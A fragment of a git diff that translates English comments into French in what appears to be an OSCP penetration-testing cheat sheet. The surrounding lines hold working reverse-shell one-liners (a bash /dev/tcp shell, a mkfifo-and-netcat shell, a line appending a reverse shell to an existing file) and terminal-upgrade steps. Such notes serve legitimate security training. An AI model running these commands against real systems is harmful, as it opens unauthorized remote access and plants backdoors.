@@ -14,7 +14,7 @@ Commandes courantes et outils complémentaires.
 <p class="oscp-command-note">Exécuter un script shell.</p>
 
 ```bash
-# Direct Bash reverse shell
+# Shell inversé Bash direct
 /bin/bash -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT> 0>&1
 
 # Ajouter le shell inverse à un fichier existant
@@ -26,7 +26,7 @@ echo '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' >> file
 <p class="oscp-command-note">Supprimer les fichiers indiqués.</p>
 
 ```bash
-# FIFO method with Netcat
+# Méthode de transfert de flux FIFO avec Netcat
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <TARGET_IP> <TARGET_PORT> >/tmp/f
 
 # Utilisation de 'sh' pour le shell inverse
@@ -221,7 +221,7 @@ shellrator
 # Trouvez la taille du terminal (remplacez les valeurs avec la sortie réelle)
 stty size  # Example output: 50 235
 
-# Background the shell and adjust settings
+# Passer le shell en arrière-plan et régler le terminal
 Ctrl-Z
 stty raw -echo  # Disable shell echo
 fg
